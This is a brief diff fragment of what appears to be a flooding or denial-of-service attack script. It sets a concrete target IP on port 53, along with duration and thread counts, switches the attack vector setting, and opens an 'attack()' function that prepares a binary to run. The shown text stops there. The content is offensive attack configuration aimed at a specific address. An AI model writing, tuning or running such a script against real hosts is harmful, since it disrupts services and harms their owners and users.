@@ -9,7 +9,7 @@ TARGET_IP = "147.75.202.61"
 TARGET_PORT = "53"
 DURATION = "240"
 THREADS = "640"
-VECTOR = "3"
+VECTOR = "2"
 
 def attack():
     # Make binary executable
